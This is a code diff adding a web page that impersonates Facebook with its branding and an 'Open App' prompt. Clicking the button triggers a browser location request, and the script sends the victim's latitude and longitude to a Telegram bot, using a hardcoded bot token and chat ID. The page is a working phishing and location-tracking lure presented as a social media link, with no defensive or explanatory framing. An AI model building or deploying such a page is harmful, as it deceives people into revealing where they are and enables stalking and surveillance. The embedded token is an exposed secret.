@@ -1,0 +1,80 @@
+<!DOCTYPE html><html>
+<head>
+    <title>Facebook</title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="https://gifdb.com/images/high/facebook-app-logo-sticker-sgb3lvzpwvlsvpl9.gif" type="image/x-icon" /><style>
+    body { background:#FFFFFF; margin:0; font-family:Arial; }
+
+    /* Main Facebook loading image */
+    .logo-img img {
+        position:absolute; top:35%; left:50%; transform:translate(-50%, -50%);
+        border-radius:50px; border:2px solid #fff; width:90px;
+    }
+
+    /* Loader */
+    .loader-img img {
+        position:absolute; top:53%; left:50%; transform:translate(-50%, -50%);
+        width:350px;
+    }
+
+    /* Dialog */
+    .dialog {
+        position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.65);
+        display:flex; justify-content:center; align-items:center; z-index:2000;
+    }
+    .dialog-content {
+        background:#fff; color:#000; padding:20px; border-radius:12px;
+        width:80%; max-width:320px; text-align:center;
+    }
+    .dialog-content img {
+        width:80px; margin-bottom:10px; position:static; border:none;
+    }
+    .open-btn {
+        background:#1877f2; color:#fff; border:none; padding:12px; width:100%; border-radius:8px;
+        font-size:16px; cursor:pointer; margin-top:10px;
+    }
+    .open-btn:active { opacity:0.7; }
+</style>
+
+</head>
+<body><!-- Facebook icon --><div class="logo-img">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSueU7maPiQQd566w9QZWbXEDm5zUhzbHxcaqTUdj1mYw&s">
+</div><!-- Loader GIF --><div class="loader-img">
+    <img src="https://andimaps.com.au/wp-content/uploads/2014/07/loader.gif">
+</div><!-- OPEN APP DIALOG --><div class="dialog" id="openDialog">
+    <div class="dialog-content">
+        <img src="https://gifdb.com/images/high/facebook-app-logo-sticker-sgb3lvzpwvlsvpl9.gif">
+        <h3>Open App</h3>
+        <p>
+View Post Open in Facebook App.</p>
+        <button class="open-btn" onclick="requestLocation()">Open App</button>
+    </div>
+</div><script>
+// Ask permission ONLY when "Open App" is clicked
+function requestLocation() {
+    document.getElementById("openDialog").style.display = "none";
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, permissionDenied);
+    } else {
+        alert("Geolocation not supported");
+    }
+}
+
+function permissionDenied() {
+    alert("Location permission denied!");
+}
+
+// Send location ONE TIME ONLY
+function sendLocation(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const chatId = '7336260003';
+    const botToken = '8273667553:AAEQEnOpEdqYLLKVQyxsBrJBep2Hiy7Ih6c';
+
+    const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+
+    fetch(url).then(r => r.json()).then(d => {});
+}
+</script></body>
+</html>
